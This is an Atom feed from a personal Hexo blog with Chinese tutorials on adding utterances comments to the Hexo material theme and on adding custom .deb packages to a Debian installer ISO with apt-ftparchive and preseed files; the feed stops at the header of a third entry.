<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Roman&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-07-15T07:06:32.408Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Roman</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>hexo主题material配置</title>
    <link href="http://yoursite.com/post/420927fd.html"/>
    <id>http://yoursite.com/post/420927fd.html</id>
    <published>2020-07-15T07:06:32.000Z</published>
    <updated>2020-07-15T07:06:32.408Z</updated>
    
    <content type="html"><![CDATA[<h2 id="hexo更换material主题"><a href="#hexo更换material主题" class="headerlink" title="hexo更换material主题"></a>hexo更换material主题</h2><h3 id="项目页面"><a href="#项目页面" class="headerlink" title="项目页面"></a>项目页面</h3><p><a href="https://github.com/bolnh/hexo-theme-material" target="_blank" rel="noopener">hexo的material主题项目页面</a></p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>安装方法很简单，把项目文件放到themes目录下，修改hexo的_config.yml中的theme为对应文件夹的名字即可。<br>因此，可以下载release包，或者进入theme的目录git clone。<br>但是最新的版本我一直生成不了网页，因此我选择了老版本的release包。</p><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>material为了更新不影响用户自己的配置，因此其配置样板文件为_config.template.yml。<br>将_config.template.yml拷贝一份并且重命名为_config.yml，_config.yml即为用户自己的配置文件。</p><h2 id="material配置utteranc"><a href="#material配置utteranc" class="headerlink" title="material配置utteranc"></a>material配置utteranc</h2><p>因为我想使用github的issue来当评论栏，常用的有gitment和gitalk，但似乎有点不太安全。<br><a href="https://www.v2ex.com/t/535608" target="_blank" rel="noopener">v2ex-建议大家弃用 Gitalk 和 Gitment 等权限过高的 Github OAuth App</a></p><p>这里我们改用utteranc。其权限划分粒度更细。</p><h3 id="1-安装utteranc生成相应配置"><a href="#1-安装utteranc生成相应配置" class="headerlink" title="1.安装utteranc生成相应配置"></a>1.安装utteranc生成相应配置</h3><p>安装utteranc应用 <a href="https://github.com/apps/utterances。" target="_blank" rel="noopener">https://github.com/apps/utterances。</a><br>指定你要存储评论的仓库，就是.github.io那个项目就行。<br>到<a href="https://utteranc.es/，填写配置，然后他会给你生成一段script。如下所示：" target="_blank" rel="noopener">https://utteranc.es/，填写配置，然后他会给你生成一段script。如下所示：</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://utteranc.es/client.js"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">repo</span>=<span class="string">"xxx/xxx.github.io"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">issue-term</span>=<span class="string">"pathname"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">label</span>=<span class="string">"comment"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">theme</span>=<span class="string">"github-light"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">crossorigin</span>=<span class="string">"anonymous"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">async</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-将utteranc集成到material"><a href="#2-将utteranc集成到material" class="headerlink" title="2.将utteranc集成到material"></a>2.将utteranc集成到material</h3><p>因为我并不会前端，所以实现的方式可能不太优雅。<br>首先通过阅读相关的代码可以发现。<br>/themes/material/layout/_partial下有个comment.ejs文件内容如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">%</span> <span class="attr">if</span>(<span class="attr">theme.comment.use</span>) &#123; %&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">%-</span> <span class="attr">partial</span>('<span class="attr">_widget</span>/<span class="attr">comment</span>/' + <span class="attr">theme.comment.use</span> + '/<span class="attr">enter</span>') %&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">%</span> &#125; %&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到真正的实现在/themes/material/layout/_widget/comment目录下。<br>在/themes/material/layout/_widget/comment目录下可以看到changyan、disqus、disqus_clik、gitment、livere、valine这几个文件夹，看来material应该是支持这几种评论插件。</p><p>我们直接依葫芦画瓢复制下gitment的文件夹，重命名为utteranc。<br>文件夹下有三个文件。<br>我稍微改了一些东西，具体的信息如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">common.ejs</span><br><span class="line"><span class="comment">&lt;!-- utteranc --&gt;</span></span><br><span class="line"></span><br><span class="line">enter.ejs</span><br><span class="line"><span class="comment">&lt;!-- 使用 utteranc --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"utteranc-comment"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">%-</span> <span class="attr">partial</span>('<span class="attr">_widget</span>/<span class="attr">comment</span>/' + <span class="attr">theme.comment.use</span> + '/<span class="attr">main</span>') %&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://utteranc.es/client.js"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">repo</span>= <span class="string">'&lt;%= theme.comment.utteranc_repo%&gt;'</span></span></span><br><span class="line"><span class="tag">        <span class="attr">issue-term</span>=<span class="string">'&lt;%= theme.comment.utteranc_issue_term%&gt;'</span></span></span><br><span class="line"><span class="tag">        <span class="attr">label</span>=<span class="string">'&lt;%= theme.comment.utteranc_label%&gt;'</span></span></span><br><span class="line"><span class="tag">        <span class="attr">theme</span>=<span class="string">'&lt;%= theme.comment.utteranc_theme%&gt;'</span></span></span><br><span class="line"><span class="tag">        <span class="attr">crossorigin</span>=<span class="string">"anonymous"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">async</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">main.ejs</span><br><span class="line"><span class="comment">&lt;!-- Utteranc 评论框 --&gt;</span></span><br></pre></td></tr></table></figure><p>当然你可以直接把生成的配置写在enter.ejs中，不过我还是更细化可配置的形式。<br>如果你是直接粘贴的网站生成的配置，那么就完成了。<br>如果你是用的我的修改，那么还需要在material的_config.yml中填上如下信息。<br>当然你的配置和我的肯定不一样。</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">comment:</span></span><br><span class="line"><span class="attr">    use:</span> <span class="string">utteranc</span></span><br><span class="line"><span class="attr">    utteranc_repo:</span> <span class="string">xxxx/xxxx.github.io</span></span><br><span class="line"><span class="attr">    utteranc_issue_term:</span> <span class="string">pathname</span></span><br><span class="line"><span class="attr">    utteranc_label:</span> <span class="string">comment✨💬✨</span></span><br><span class="line"><span class="attr">    utteranc_theme:</span> <span class="string">github-light</span></span><br></pre></td></tr></table></figure><p>接下来hexo clean,hexo g,hexo s。看看是否有评论栏了吧。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;hexo更换material主题&quot;&gt;&lt;a href=&quot;#hexo更换material主题&quot; class=&quot;headerlink&quot; title=&quot;hexo更换material主题&quot;&gt;&lt;/a&gt;hexo更换material主题&lt;/h2&gt;&lt;h3 id=&quot;项目页面&quot;&gt;&lt;a 
      
    
    </summary>
    
    
      <category term="hexo" scheme="http://yoursite.com/categories/hexo/"/>
    
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="hexo" scheme="http://yoursite.com/tags/hexo/"/>
    
      <category term="material" scheme="http://yoursite.com/tags/material/"/>
    
      <category term="utteranc" scheme="http://yoursite.com/tags/utteranc/"/>
    
  </entry>
  
  <entry>
    <title>在Debian安装镜像中添加软件包</title>
    <link href="http://yoursite.com/post/5092e38f.html"/>
    <id>http://yoursite.com/post/5092e38f.html</id>
    <published>2019-11-13T08:09:12.000Z</published>
    <updated>2019-11-19T10:45:23.544Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>本教程是在ubuntu16.04 desktop amd64上进行编辑。<br>镜像为debian-10.1.0-amd64-xfce-CD-1。<br>上一个教程根据Ubuntu wiki上的定制iso方法一步一步制作的，这次我将尽量简化步骤，以及补充相关的说明。</p><p>参考地址：<br><a href="https://wiki.debian.org/DebianInstaller/Modify/CD" target="_blank" rel="noopener">debian wiki-modify CD</a><br><a href="https://wiki.debian.org/DebianCustomCD" target="_blank" rel="noopener">debian wiki-customCD</a><br><a href="https://wiki.debian.org/DebianInstaller/Preseed#Default_preseed_files" target="_blank" rel="noopener">debianinstaller preseed</a><br><a href="https://wiki.debian.org/DebianInstaller/Preseed/EditIso" target="_blank" rel="noopener">preseeding the installer from its initrd</a></p><h2 id="1-解压镜像"><a href="#1-解压镜像" class="headerlink" title="1.解压镜像"></a>1.解压镜像</h2><p>和Ubuntu的一致<br>挂载镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -o loop <span class="variable">$isopath</span> <span class="variable">$mountpoint</span></span><br></pre></td></tr></table></figure><p>使用rsync复制文件到硬盘</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync -av <span class="variable">$mountpoint</span> <span class="variable">$imagepath</span></span><br></pre></td></tr></table></figure><p>或者直接使用cp命令拷贝</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p <span class="variable">$imagepath</span></span><br><span class="line">cp -a <span class="variable">$mountpoint</span> <span class="variable">$imagepath</span></span><br></pre></td></tr></table></figure><p>也可以直接将iso解压</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bsdtar -C <span class="variable">$imagepath</span> -xf debian-10.1.0-amd64-xfce-CD-1.iso</span><br></pre></td></tr></table></figure><h2 id="2-添加deb包"><a href="#2-添加deb包" class="headerlink" title="2.添加deb包"></a>2.添加deb包</h2><p>这次我懒得创建extras组件了，直接把deb放到pool/main相应的文件夹下，为了美观以及减少出现不可预知的bug，我采取了和其它deb包相同的结构，比如我的软件以字母s开头，就放在了pool/main/s/软件名/下面。</p><h2 id="3-重新生成Pakages和Release文件"><a href="#3-重新生成Pakages和Release文件" class="headerlink" title="3.重新生成Pakages和Release文件"></a>3.重新生成Pakages和Release文件</h2><p>从网上下载indices似乎是没有必要的，我只在main仓库下添加了包，因此只需要修改相应的文件就行，手动修改太麻烦，这里使用apt-ftparchive。配置文件如下</p><p>apt-ftparchive-deb.conf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Dir &#123;</span><br><span class="line">  ArchiveDir <span class="string">"<span class="variable">$imagepath</span>"</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">TreeDefault &#123;</span><br><span class="line">  Directory <span class="string">"pool/"</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">BinDirectory <span class="string">"pool/main"</span> &#123;</span><br><span class="line">  Packages <span class="string">"dists/<span class="variable">$DIST</span>/main/binary-amd64/Packages"</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">BinDirectory <span class="string">"pool/contrib"</span> &#123;</span><br><span class="line"> Packages <span class="string">"dists/<span class="variable">$DIST</span>/contrib/binary-amd64/Packages"</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Default &#123;</span><br><span class="line">  Packages &#123;</span><br><span class="line">    Extensions <span class="string">".deb"</span>;</span><br><span class="line">    Compress <span class="string">". gzip"</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Contents &#123;</span><br><span class="line">  Compress <span class="string">"gzip"</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>release .conf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">APT::FTPArchive::Release::Codename <span class="string">"<span class="variable">$DIST</span>"</span>;</span><br><span class="line">APT::FTPArchive::Release::Origin <span class="string">"Debian"</span>;</span><br><span class="line">APT::FTPArchive::Release::Components <span class="string">"main"</span>;</span><br><span class="line">APT::FTPArchive::Release::Label <span class="string">"Debian"</span>;</span><br><span class="line">APT::FTPArchive::Release::Architectures <span class="string">"amd64"</span>;</span><br><span class="line">APT::FTPArchive::Release::Suite <span class="string">"testing"</span>;</span><br></pre></td></tr></table></figure><p>先构建Package</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-ftparchive generate apt-ftparchive-deb.conf</span><br></pre></td></tr></table></figure><p>这个时候会扫描pool/mian下面的软件包然后将信息写入dists/$DIST/main/binary-amd64/Packages<br>在apt-ftparchive-deb.conf配置中体现</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BinDirectory <span class="string">"pool/main"</span> &#123;</span><br><span class="line">  Packages <span class="string">"dists/<span class="variable">$DIST</span>/main/binary-amd64/Packages"</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Packages内保存了deb的信息（也就是deb包构建时，control里面的信息）、deb包的位置、deb包的大小以及md5之类验证值。</p><p>生成Release文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-ftparchive release <span class="variable">$imagepath</span>/dists/<span class="variable">$DIST</span> &gt;&gt; <span class="variable">$imagepath</span>/dists/<span class="variable">$DIST</span>/Release</span><br></pre></td></tr></table></figure><p>Release文件比较简单，就是一些描述文件，和Pakage文件以及翻译文件的位置和md5之类的验证信息（有MD5、sha1、sha256、sha512）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Architectures: amd64</span><br><span class="line">Codename: buster</span><br><span class="line">Components: main</span><br><span class="line">Date: Tue, 12 Nov 2019 09:09:47 UTC</span><br><span class="line">Label: Debian</span><br><span class="line">Origin: Debian</span><br><span class="line">Suite: testing</span><br><span class="line">MD5Sum:</span><br><span class="line"> b5529ca7f3228f4c06507cc9becfaf7a              135 Release</span><br><span class="line"> d41d8cd98f00b204e9800998ecf8427e                0 contrib/binary-amd64/Packages</span><br><span class="line"> e62ff0123a74adfc6903d59a449cbdb0               40 contrib/binary-amd64/Packages.gz</span><br><span class="line"> e5e5d8f8688a49f7836b62b0f605b694              119 contrib/binary-amd64/Release</span><br><span class="line"> 040f7f5196ce62a26b596e10fe0c924e          1246183 main/binary-amd64/Packages</span><br><span class="line"> fb9b1a586d9c0e6f639ffee5e186fbc4           414562 main/binary-amd64/Packages.gz</span><br><span class="line"> dd30475d155e4b1beab9c1b8d7d1d703              116 main/binary-amd64/Release</span><br><span class="line"> 600f266567b08466e6c2e46f6f2a4856            40987 main/debian-installer/binary-amd64/Packages.gz</span><br><span class="line"> dd30475d155e4b1beab9c1b8d7d1d703              116 main/debian-installer/binary-amd64/Release</span><br><span class="line"> 4e0f08499f56c7a4da3ef2a02749d657             2950 main/i18n/Translation-ca.gz</span><br><span class="line"> b19a6ca7c0521247707371291a5d7a04            47191 main/i18n/Translation-cs.gz</span><br><span class="line">...<span class="comment">#下面的就不放出来了</span></span><br></pre></td></tr></table></figure><h2 id="4-添加preseed-cfg"><a href="#4-添加preseed-cfg" class="headerlink" title="4.添加preseed.cfg"></a>4.添加preseed.cfg</h2><p>按照我的想法都已经放入了mian里面了，还把信息写入了Package，应该会自动安装，但是并没有，看来安装系统在其他地方自己维护了一个安装列表，当然我们可以找找修改initrd的方法，但是debian-installer提供了preseed的机制我们就使用这个吧。</p><p>我们可以看到Debian的目录下并没有Ubuntu一样的preseed文件夹。<br>debian和Ubuntu目录展示</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#debian</span></span><br><span class="line">.</span><br><span class="line">├── autorun.inf</span><br><span class="line">├── boot</span><br><span class="line">├── css</span><br><span class="line">├── debian -&gt; .</span><br><span class="line">├── dists</span><br><span class="line">├── doc</span><br><span class="line">├── EFI</span><br><span class="line">├── firmware</span><br><span class="line">├── g2ldr</span><br><span class="line">├── g2ldr.mbr</span><br><span class="line">├── install</span><br><span class="line">├── install.amd</span><br><span class="line">├── isolinux</span><br><span class="line">├── md5sum.txt</span><br><span class="line">├── pics</span><br><span class="line">├── pool</span><br><span class="line">├── README.html</span><br><span class="line">├── README.mirrors.html</span><br><span class="line">├── README.mirrors.txt</span><br><span class="line">├── README.source</span><br><span class="line">├── README.txt</span><br><span class="line">├── setup.exe</span><br><span class="line">├── tools</span><br><span class="line">└── win32-loader.ini</span><br><span class="line"></span><br><span class="line"><span class="comment">#Ubuntu</span></span><br><span class="line">.</span><br><span class="line">├── boot</span><br><span class="line">├── dists</span><br><span class="line">├── doc</span><br><span class="line">├── EFI</span><br><span class="line">├── install</span><br><span class="line">├── isolinux</span><br><span class="line">├── md5sum.txt</span><br><span class="line">├── pics</span><br><span class="line">├── pool</span><br><span class="line">├── preseed</span><br><span class="line">├── README.diskdefines</span><br><span class="line">└── ubuntu -&gt; .</span><br></pre></td></tr></table></figure><p>如何确定pressed其实是在isoliuux目录下的cfg文件确定，cfg间相互引用全弄明白其实挺麻烦的，这里我给出我找到的cfg文件，就是isolinux/txt.cfg<br>cfg文件对比</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#debian</span></span><br><span class="line">label install</span><br><span class="line">menu label ^Install</span><br><span class="line">kernel /install.amd/vmlinuz</span><br><span class="line">append desktop=xfce vga=788 initrd=/install.amd/initrd.gz --- quiet </span><br><span class="line"></span><br><span class="line"><span class="comment">#ubuntu</span></span><br><span class="line">default install</span><br><span class="line">label install</span><br><span class="line">  menu label ^Install Ubuntu Server</span><br><span class="line">  kernel /install/vmlinuz</span><br><span class="line">  append  file=/cdrom/preseed/ubuntu-server.seed vga=788 initrd=/install/initrd.gz quiet ---</span><br><span class="line">label hwe-install</span><br><span class="line">  menu label ^Install Ubuntu Server with the HWE kernel</span><br><span class="line">  kernel /install/hwe-vmlinuz</span><br><span class="line">  append  file=/cdrom/preseed/hwe-ubuntu-server.seed vga=788 initrd=/install/hwe-initrd.gz quiet ---</span><br><span class="line">label maas</span><br><span class="line">  menu label ^Install MAAS Region Controller</span><br><span class="line">  kernel /install/vmlinuz</span><br><span class="line">  append   modules=maas-region-udeb vga=788 initrd=/install/initrd.gz quiet ---</span><br><span class="line"></span><br><span class="line">label maasrack</span><br><span class="line">  menu label ^Install MAAS Rack Controller</span><br><span class="line">  kernel /install/vmlinuz</span><br><span class="line">  append   modules=maas-rack-udeb vga=788 initrd=/install/initrd.gz quiet ---</span><br><span class="line">label check</span><br><span class="line">  menu label ^Check disc <span class="keyword">for</span> defects</span><br><span class="line">  kernel /install/vmlinuz</span><br><span class="line">  append   MENU=/bin/cdrom-checker-menu vga=788 initrd=/install/initrd.gz quiet ---</span><br><span class="line">label memtest</span><br><span class="line">  menu label Test ^memory</span><br><span class="line">  kernel /install/mt86plus</span><br><span class="line">label hd</span><br><span class="line">  menu label ^Boot from first hard disk</span><br><span class="line">  localboot 0x80</span><br></pre></td></tr></table></figure><p>这里可以看到Ubuntu的append字段里面指明了preseed的位置file=/cdrom/preseed/ubuntu-server.seed，因此我们在debian的append中加入file=/cdrom/pressd.cfg然后将命令写入即可。</p><ul><li>这里使用preseed.cfg而不采用preseed/xxxx.seed是因为我在debian wiki上看到他们都采用preseed.cfg的命名，入乡随俗。</li></ul><p>这里其实只相当于完成了一半，可以看到ubuntu的txt.cfg比debian的怎么多了这么多，debian这只有install，还有图形的install和一些check之类的配置呢？</p><p>debian的isolinux目录下仔细查找可以找到gtk.cfg，其内容如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">default installgui</span><br><span class="line">label installgui</span><br><span class="line">menu label ^Graphical install</span><br><span class="line">menu default</span><br><span class="line">kernel /install.amd/vmlinuz</span><br><span class="line">append desktop=xfce vga=788 initrd=/install.amd/gtk/initrd.gz --- quiet</span><br></pre></td></tr></table></figure><p>没错从名字可以看出，这个就是带界面安装系统的配置文件，在这里我们也需要将preseed文件的位置加上。</p><p>在Ubuntu中我们采用的是将</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d-i preseed/late_command string apt-install <span class="variable">$packgename</span></span><br></pre></td></tr></table></figure><p>写入到seed文件底部，这个的意思是在安装的最后阶段执行package的安装，看起来不太优雅。<br>这里我给出一种新的写法<br>preseed.cfg：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d-i pkgsel/include string <span class="variable">$packgename</span></span><br></pre></td></tr></table></figure><p>这个是在安装完系统默认的软件包后，安装你的软件包（执行阶段为select and install package）</p><h2 id="5-生成iso"><a href="#5-生成iso" class="headerlink" title="5.生成iso"></a>5.生成iso</h2><p>这里和Ubuntu一样<br>对md5文件进行签名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="variable">$imagepath</span></span><br><span class="line">find -<span class="built_in">type</span> f -print0 | sudo xargs -0 md5sum | grep -v isolinux/ | grep -v md5sum  |sudo tee md5sum.txt</span><br></pre></td></tr></table></figure><p>-b 和 -c指定的路径都是相对于$imagepath来说的，最终会$imagepath下生成iso。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">IMAGE=custom.iso</span><br><span class="line"></span><br><span class="line">mkisofs -r -V <span class="string">"Custom Ubuntu Install CD"</span> \</span><br><span class="line">            -cache-inodes \</span><br><span class="line">            -J -l -b isolinux/isolinux.bin \</span><br><span class="line">            -c isolinux/boot.cat -no-emul-boot \</span><br><span class="line">            -boot-load-size 4 -boot-info-table \</span><br><span class="line">            -o <span class="variable">$IMAGE</span> <span class="variable">$imagepath</span></span><br></pre></td></tr></table></figure><h2 id="6-其他附加preseed的方法"><a href="#6-其他附加preseed的方法" class="headerlink" title="6.其他附加preseed的方法"></a>6.其他附加preseed的方法</h2><p>由于iso会提供多种安装方式，因此往每个安装方式指定preseed有点麻烦，在debian的wiki上给出了三种方式。</p><ul><li>将preseed.cfg附加到initrd</li><li>指定preseed.cfg的位置（上面使用的方法）</li><li>从网上下载preseed.cfg</li></ul><p>下载preseed有点麻烦，需要搭建提供下载的服务器，这里就不再展开了。<br>重点讲讲第一种方法。<br>debian镜像文件中有一个install.amd的目录，我们就使用这个目录.<br>这里给出脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">isopath=~/debianiso</span><br><span class="line">chmod +w -R $isopath/install.amd/</span><br><span class="line">pushd $isopath/install.amd</span><br><span class="line">cat &gt; preseed.cfg &lt;&lt; EOF#生成preseed.cfg文件</span><br><span class="line">d-i pkgsel/include string secagent</span><br><span class="line">EOF</span><br><span class="line">#查找所有的initrd.gz</span><br><span class="line">for initrd in $(find $isopath/install.amd/ -name initrd.gz);do</span><br><span class="line">        gzip -d $initrd</span><br><span class="line">        echo preseed.cfg | cpio -H newc -o -A -F $(dirname $initrd)/initrd#将preseed.cfg附加上去</span><br><span class="line">        gzip $(dirname $initrd)/initrd</span><br><span class="line">done</span><br><span class="line">rm -f preseed.cfg</span><br><span class="line">chmod -w -R $isopath/install.amd/</span><br><span class="line">popd</span><br></pre></td></tr></table></figure><h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><p>如果你对于preseed文件有兴趣<br>这里给出Ubuntu的preseed示例文件,你也可以在Ubunut的镜像下找到（目录doc\install\manual\example-preseed.txt.gz）<br>太长懒得放上来了，自己解压镜像去找吧。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;本教程是在ubuntu16.04 desktop amd64上进行编辑。&lt;br&gt;镜像为debian-10.1.0-amd64-xfce-CD
      
    
    </summary>
    
    
      <category term="Linux" scheme="http://yoursite.com/categories/Linux/"/>
    
    
      <category term="linux" scheme="http://yoursite.com/tags/linux/"/>
    
      <category term="Debian" scheme="http://yoursite.com/tags/Debian/"/>
    
  </entry>
  
  <entry>
    <title>在Ubuntu安装镜像中添加软件包</title>
    <link href="http://yoursite.com/post/6a6ee787.html"/>
    <id>http://yoursite.com/post/6a6ee787.html</id>
    <published>2019-11-11T07:54:42.000Z</published>
    <updated>2019-11-13T08:10:00.195Z</updated>
    
